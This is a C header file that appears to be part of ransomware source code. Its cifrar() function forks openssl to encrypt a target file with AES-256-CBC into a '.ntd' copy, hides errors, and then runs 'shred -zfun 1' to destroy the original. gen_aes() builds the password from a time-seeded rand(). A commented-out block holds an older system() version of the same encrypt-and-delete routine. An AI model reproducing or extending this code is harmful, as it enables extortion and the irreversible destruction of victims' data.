#ifndef _CRYPTO_H
#define _CRYPTO_H

char * gen_aes(){
    static char aes[48];
    srand(time(NULL)); 
    /*
    * todo: replace with c++ code
    */
    char dic[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for(int i=0; i<48; i++){
        aes[i] = dic[rand () % strlen(dic)];
    }
    //printf("%s\n",aes);
    return aes;
}

void cifrar(char path[], char file[], char passwd[]) {
    int nullfd = open("/dev/null", O_WRONLY);
    char command[100000]="(openssl enc -aes-256-cbc -pass pass:";
    char passpass[128] = "pass:";
    char pathfile[128] = "";
    char pathfilentd[128] = "";
    strcat(passpass, passwd);
    strcat(pathfile, path);
    strcat(pathfile, "/");
    strcat(pathfile, file);
    strcat(pathfilentd, pathfile);
    strcat(pathfilentd, ".ntd");

    int mypipe[2];
    int r = pipe(mypipe);

    if (r < 0) {
        dbgerr("Error on creating pipe.\n");
        exit(7);
    }
    
    int fc = fork();

    if (fc < 0) {
        /* error */
        dbgerr("Error on crypting files...");
    } else if (fc == 0) {
        debug("Encrypting %s", pathfile);
        char * ciphcmd[] = {
            "openssl", "enc", "-aes-256-cbc", "-pass", passpass,
            "-in", pathfile, "-out", pathfilentd, (char *) NULL
        };
        dup2(nullfd, STDERR_FILENO);
        int e = execv("/usr/bin/openssl", ciphcmd);
        exit(e);
    } else {
        int status;
        int ro = wait(&status);
        int fcc = fork();
        if (fcc < 0) {
            debug("Error on fork()");
        } else if (fcc == 0) {
            dup2(nullfd, STDERR_FILENO);
            debug("Shreding %s", pathfile);
            char * shredcmd[] = {
                "shred", "-zfun", "1", pathfile, (char *) NULL
            };
            int e = execv("/usr/bin/shred", shredcmd);
            exit(e);
        } else {
            int stts;
            int rto = wait(&status);
            /* nothing here */
        }
    }

  
    /**

    strcat(command, passwd);
    strcat(command," -in '");
    strcat(command,path);
    strcat(command,"/");
    strcat(command,file);
    strcat(command,"' -out '");
    strcat(command,path);
    strcat(command,"/");
    strcat(command,file);
    strcat(command,".ntd' 2>/dev/null; /usr/bin/shred -zfun 1 '");
    strcat(command,path);
    strcat(command,"/");
    strcat(command,file);
    strcat(command,"' 2>/dev/null)&");


    //(openssl enc -aes-256-cbc -pass pass:1234 -in plain.txt -out plain.txt.ntd 2>/dev/null; rm plain.txt 2>/dev/null)&
    system(command);
     **/
}

#endif